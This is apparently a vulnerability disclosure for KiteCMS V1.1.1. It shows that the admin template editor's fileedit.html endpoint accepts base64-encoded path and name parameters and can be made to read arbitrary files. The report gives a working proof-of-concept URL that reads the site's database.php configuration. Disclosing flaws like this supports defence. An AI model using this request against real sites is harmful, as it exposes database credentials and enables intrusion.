## Arbitrary file reading vulnerability exists in background module management in KiteCMS-V1.1.1

Vulnerability Position：ip/index.php/admin/template/filelist.html

Log in to the backend：

Visit http://ip/index.php/admin/template/filelist.html ， Will access the page of the module

Click to edit，It jumps to another page ---> http://192.168.1.128/index.php/admin/template/fileedit.html?path=RDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3RoZW1lL2NvbXBhbnkvYmFzZS5odG1s&name=YmFzZS5odG1s

and we find that the path and name parameters are encrypted by base64 by reporting an error.

![image](https://user-images.githubusercontent.com/54017627/161426724-f2d9bda6-5a26-46f9-8f83-7e9980e22c74.png)

![image](https://user-images.githubusercontent.com/54017627/161426977-33532da0-36c1-4643-b051-f12014f420f5.png)

```
http://192.168.1.128/index.php/admin/template/fileedit.html?path=RDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3RoZW1lL2NvbXBhbnkvYmFzZS5odG1s&name=YmFzZS5odG1s
path=RDovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXL3RoZW1lL2NvbXBhbnkvYmFzZS5odG1s---> D:/phpStudy/PHPTutorial/WWW/theme/company/base.html
name=YmFzZS5odG1s --->base.html
```

![image](https://user-images.githubusercontent.com/54017627/161426913-68ed20df-fd6d-48cd-8fe8-77f7b68b8adb.png)

![image](https://user-images.githubusercontent.com/54017627/161426891-5dc32924-3961-4640-b09f-f362e160528c.png)

We found the warehouse of the cms in github and inferred the local path of the database file configuration of the cms

The local path to the database file configuration of the cms: D:\phpStudy\PHPTutorial\WWW\config\database.php

We encode the path with base64 ---> RDpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXGNvbmZpZ1xkYXRhYmFzZS5waHA=

![image](https://user-images.githubusercontent.com/54017627/161427483-4628467a-6512-4dff-9898-47b7eba27494.png)

Then splice the transcoded path to the url: http://ip/index.php/admin/template/fileedit.html?path=RDpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXGNvbmZpZ1xkYXRhYmFzZS5waHA=&name=ZGF0YWJhc2UucGhw

Access found that the database configuration file of the cms was successfully read.

![image](https://user-images.githubusercontent.com/54017627/161427556-375d9ee3-f5e2-4ac4-8f86-0778b8567aed.png)
